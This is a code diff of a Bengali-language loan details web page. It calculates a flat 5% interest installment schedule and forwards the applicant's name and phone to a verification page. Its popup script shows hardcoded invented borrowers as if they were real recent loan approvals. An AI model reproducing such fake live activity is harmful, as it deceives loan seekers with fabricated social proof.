@@ -6,44 +6,198 @@
     <title>লোনের বিবরণ</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Roboto, sans-serif; }
-        body { background: #0f172a; min-height: 100vh; display: flex; justify-content: center; }
-        .container { width: 100%; max-width: 450px; background: #ffffff; min-height: 100vh; display: flex; flex-direction: column; position: relative; }
-        .header { background: linear-gradient(135deg, #1e3a8a, #3b82f6); color: #ffffff; padding: 30px 20px 50px; text-align: center; }
-        .header h2 { font-size: 22px; margin-bottom: 6px; }
-        .header p { font-size: 13px; opacity: 0.9; }
-        .card-wrap { margin: -30px 16px 20px; background: #ffffff; border-radius: 16px; box-shadow: 0 8px 25px rgba(0,0,0,0.08); padding: 16px; flex-grow: 1; display: flex; flex-direction: column; }
-        .banner { background: linear-gradient(135deg, #1e3a8a, #2563eb); border-radius: 12px; padding: 18px 10px; display: flex; justify-content: space-around; color: #ffffff; text-align: center; margin-bottom: 20px; }
-        .col { flex: 1; }
-        .col:not(:last-child) { border-right: 1px solid rgba(255,255,255,0.2); }
-        .col span { font-size: 11px; opacity: 0.9; display: block; margin-bottom: 5px; }
-        .col strong { font-size: 16px; }
-        .schedule-table { width: 100%; border-collapse: collapse; font-size: 13px; margin-bottom: 25px; border: 1px solid #e2e8f0; border-radius: 10px; overflow: hidden; }
-        .schedule-table th { background: #f1f5f9; color: #475569; padding: 10px; text-align: left; }
-        .schedule-table td { padding: 12px 10px; border-top: 1px solid #e2e8f0; color: #1e293b; }
-        .btn-next { margin-top: auto; display: flex; align-items: center; justify-content: center; gap: 10px; padding: 15px; background: linear-gradient(135deg, #1e3a8a, #3b82f6); color: #ffffff; text-decoration: none; border-radius: 30px; font-weight: bold; }
+        * { 
+            box-sizing: border-box; 
+            margin: 0; 
+            padding: 0; 
+            font-family: 'Segoe UI', Roboto, sans-serif; 
+        }
 
-        .loan-popup { position: fixed; bottom: 20px; left: 20px; background: #ffffff; color: #1e293b; padding: 12px 16px; border-radius: 12px; box-shadow: 0 8px 24px rgba(0, 0, 0, 0.15); display: flex; align-items: center; gap: 12px; z-index: 9999; max-width: 340px; border-left: 5px solid #16a34a; opacity: 0; transform: translateY(30px); transition: all 0.5s ease-in-out; pointer-events: none; }
-        .loan-popup.show { opacity: 1; transform: translateY(0); pointer-events: auto; }
-        .popup-icon { width: 38px; height: 38px; background: #dcfce7; color: #16a34a; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 18px; flex-shrink: 0; }
+        /* মূল ব্যাকগ্রাউন্ড সম্পূর্ণ সাদা */
+        body { 
+            background: #ffffff; 
+            min-height: 100vh; 
+            display: flex; 
+            justify-content: center; 
+        }
+
+        .container { 
+            width: 100%; 
+            max-width: 450px; 
+            background: #ffffff; 
+            min-height: 100vh; 
+            display: flex; 
+            flex-direction: column; 
+            position: relative; 
+            box-shadow: 0 0 25px rgba(255, 94, 0, 0.08);
+            border-left: 1px solid #fff7ed;
+            border-right: 1px solid #fff7ed;
+        }
+
+        /* কমলা গ্রেডিয়েন্ট হেডার */
+        .header { 
+            background: linear-gradient(135deg, #ff5e00, #ff8800); 
+            color: #ffffff; 
+            padding: 28px 20px 50px; 
+            text-align: center; 
+            border-bottom-left-radius: 24px;
+            border-bottom-right-radius: 24px;
+            box-shadow: 0 4px 15px rgba(255, 94, 0, 0.2);
+        }
+        .header-logo-wrap {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 12px;
+        }
+        .header-logo {
+            width: 60px;
+            height: 60px;
+            object-fit: cover;
+            border-radius: 50%;
+            background: #ffffff;
+            padding: 2px;
+            border: 2px solid #ffffff;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+        }
+        .header h2 { font-size: 22px; margin-bottom: 4px; font-weight: 700; }
+        .header p { font-size: 13px; opacity: 0.95; }
+
+        /* বিবরণ কার্ড ও কিস্তির হিসাব */
+        .card-wrap { 
+            margin: -30px 16px 20px; 
+            background: #ffffff; 
+            border-radius: 18px; 
+            box-shadow: 0 10px 30px rgba(255, 94, 0, 0.1); 
+            border: 1.5px solid #fed7aa;
+            padding: 18px; 
+            flex-grow: 1; 
+            display: flex; 
+            flex-direction: column; 
+        }
+
+        /* কমলা ব্যানার বক্স */
+        .banner { 
+            background: linear-gradient(135deg, #ff5e00, #ff8800); 
+            border-radius: 14px; 
+            padding: 18px 10px; 
+            display: flex; 
+            justify-content: space-around; 
+            color: #ffffff; 
+            text-align: center; 
+            margin-bottom: 22px; 
+            box-shadow: 0 4px 12px rgba(255, 94, 0, 0.2);
+        }
+        .col { flex: 1; }
+        .col:not(:last-child) { border-right: 1px solid rgba(255, 255, 255, 0.3); }
+        .col span { font-size: 11px; opacity: 0.95; display: block; margin-bottom: 5px; }
+        .col strong { font-size: 15.5px; font-weight: 800; }
+
+        /* কিস্তির টেবিল */
+        .schedule-table { 
+            width: 100%; 
+            border-collapse: collapse; 
+            font-size: 13px; 
+            margin-bottom: 25px; 
+            border: 1px solid #fed7aa; 
+            border-radius: 12px; 
+            overflow: hidden; 
+        }
+        .schedule-table th { 
+            background: #fffaf5; 
+            color: #ea580c; 
+            padding: 11px 12px; 
+            text-align: left; 
+            font-weight: 700;
+            border-bottom: 1.5px solid #fed7aa;
+        }
+        .schedule-table td { 
+            padding: 12px 10px; 
+            border-top: 1px solid #ffedd5; 
+            color: #1e293b; 
+        }
+
+        /* কমলা কনফার্মেশন বাটন */
+        .btn-next { 
+            margin-top: auto; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            gap: 10px; 
+            padding: 15px; 
+            background: linear-gradient(135deg, #ff5e00, #ff8800); 
+            color: #ffffff; 
+            text-decoration: none; 
+            border-radius: 30px; 
+            font-weight: bold; 
+            font-size: 15px;
+            box-shadow: 0 4px 15px rgba(255, 94, 0, 0.3);
+            transition: transform 0.2s;
+        }
+        .btn-next:active { transform: scale(0.98); }
+
+        /* লাইভ সোশ্যাল-প্রুফ পপআপ */
+        .loan-popup { 
+            position: fixed; 
+            bottom: 20px; 
+            left: 20px; 
+            background: #ffffff; 
+            color: #1e293b; 
+            padding: 12px 16px; 
+            border-radius: 12px; 
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.15); 
+            display: flex; 
+            align-items: center; 
+            gap: 12px; 
+            z-index: 9999; 
+            max-width: 340px; 
+            border-left: 5px solid #16a34a; 
+            opacity: 0; 
+            transform: translateY(30px); 
+            transition: all 0.5s ease-in-out; 
+            pointer-events: none; 
+        }
+        .loan-popup.show { 
+            opacity: 1; 
+            transform: translateY(0); 
+            pointer-events: auto; 
+        }
+        .popup-icon { 
+            width: 38px; 
+            height: 38px; 
+            background: #dcfce7; 
+            color: #16a34a; 
+            border-radius: 50%; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            font-size: 18px; 
+            flex-shrink: 0; 
+        }
         .popup-content { display: flex; flex-direction: column; }
         .popup-title { font-size: 13.5px; font-weight: 700; color: #0f172a; margin-bottom: 2px; }
         .popup-desc { font-size: 12px; color: #16a34a; font-weight: 600; }
         .popup-time { font-size: 10px; color: #94a3b8; margin-top: 2px; }
+        @media (max-width: 480px) { 
+            .loan-popup { left: 15px; right: 15px; max-width: none; bottom: 15px; } 
+        }
     </style>
 </head>
 <body>
 
 <div class="container">
     <div class="header">
-        <h2>লোনের সারাংশ</h2>
-        <p>তথ্যগুলো যাচাই করে নিশ্চিত করুন</p>
+        <div class="header-logo-wrap">
+            <!-- আপনার কোম্পানির লোগো -->
+            <img src="logoo.png" alt="Company Logo" class="header-logo">
+        </div>
+        <h2>লোনের বিবরণ ও কিস্তি</h2>
+        <p>আপনার আবেদনের হিসাবগুলো যাচাই করুন</p>
     </div>
 
     <div class="card-wrap">
         <div class="banner">
             <div class="col"><span>লোন পরিমাণ</span><strong id="dispAmount">৳০</strong></div>
-            <div class="col"><span>মোট চার্জ/মুনাফা</span><strong id="dispFee">৳০</strong></div>
+            <div class="col"><span>মোট সুদ (৫%)</span><strong id="dispFee">৳০</strong></div>
             <div class="col"><span>সর্বমোট দেয়</span><strong id="dispTotal">৳০</strong></div>
         </div>
 
@@ -75,29 +229,42 @@
 </div>
 
 <script>
+    // URL থেকে আগের পেজের নাম, মোবাইল, পরিমাণ ও মেয়াদ গ্রহণ
     const params = new URLSearchParams(window.location.search);
     const name = params.get('name') || '';
     const phone = params.get('phone') || '';
-    const rawAmount = params.get('amount') || '3000';
+    const rawAmount = params.get('amount') || '30000';
     const rawTenure = params.get('tenure') || '3';
 
-    const numAmount = parseInt(rawAmount.replace(/[^0-9]/g, '')) || 3000;
-    const numMonths = parseInt(rawTenure.replace(/[^0-9]/g, '')) || 3;
+    // বাংলা বা ইংরেজি সংখ্যা ক্লিন করে পিওর নাম্বারে রূপান্তর
+    const numMap = {'০':0, '১':1, '২':2, '৩':3, '৪':4, '৫':5, '৬':6, '৭':7, '৮':8, '৯':9};
+    function parsePureNum(str) {
+        if (!str) return 0;
+        const converted = str.toString().replace(/[০-৯]/g, d => numMap[d]);
+        return parseInt(converted.replace(/[^0-9]/g, ''), 10) || 0;
+    }
 
-    const fee = Math.round(numAmount * 0.015 * numMonths);
-    const total = numAmount + fee;
-    const monthly = Math.round(total / numMonths);
+    const numAmount = parsePureNum(rawAmount) || 30000;
+    const numMonths = parsePureNum(rawTenure) || 3;
+
+    // মোট লোনের পরিমাণের ওপর সরাসরি ফিক্সড ৫% সুদ
+    const totalInterest = Math.round(numAmount * 0.05);
+    const totalPayable = numAmount + totalInterest;
+    const monthlyInstallment = Math.round(totalPayable / numMonths);
 
     function toBn(num) {
         const bn = ['০', '১', '২', '৩', '৪', '৫', '৬', '৭', '৮', '৯'];
         return num.toString().replace(/[0-9]/g, d => bn[d]);
     }
 
+    // ব্যানারে লাইভ ডেটা সেট
     document.getElementById('dispAmount').innerText = '৳' + toBn(numAmount.toLocaleString('en-US'));
-    document.getElementById('dispFee').innerText = '৳' + toBn(fee.toLocaleString('en-US'));
-    document.getElementById('dispTotal').innerText = '৳' + toBn(total.toLocaleString('en-US'));
+    document.getElementById('dispFee').innerText = '৳' + toBn(totalInterest.toLocaleString('en-US'));
+    document.getElementById('dispTotal').innerText = '৳' + toBn(totalPayable.toLocaleString('en-US'));
 
+    // কিস্তির তালিকা তৈরি (যত মাস নির্বাচিত, ততগুলো কিস্তি)
     const tbody = document.getElementById('rows');
+    tbody.innerHTML = '';
     const today = new Date();
     const months = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"];
 
@@ -107,13 +274,17 @@
             <tr>
                 <td>কিস্তি ${toBn(i)}</td>
                 <td>${d.getDate()} ${months[d.getMonth()]}, ${d.getFullYear()}</td>
-                <td style="text-align: right; font-weight: bold; color: #1e3a8a;">৳${toBn(monthly)}</td>
+                <td style="text-align: right; font-weight: bold; color: #ff5e00;">৳${toBn(monthlyInstallment.toLocaleString('en-US'))}</td>
             </tr>
         `;
     }
 
-    document.getElementById('nextLink').href = "verify.html?name=" + encodeURIComponent(name) + "&phone=" + encodeURIComponent(phone) + "&amount=" + encodeURIComponent(rawAmount);
+    // পরবর্তী পেজের লিঙ্কে ডেটা পাঠানো
+    document.getElementById('nextLink').href = "verify.html?name=" + encodeURIComponent(name) + 
+                                               "&phone=" + encodeURIComponent(phone) + 
+                                               "&amount=" + encodeURIComponent(numAmount);
 
+    // পপআপ স্ক্রিপ্ট
     const loanData = [
         { name: "রহিমা খাতুন", district: "ঢাকা", amount: "১০,০০০", time: "এইমাত্র" },
         { name: "আসলাম খান", district: "কুমিল্লা", amount: "২০,০০০", time: "২ মিনিট আগে" },
@@ -139,5 +310,6 @@
 
     setTimeout(() => { showNextNotification(); setInterval(showNextNotification, 8000); }, 2000);
 </script>
+
 </body>
 </html>
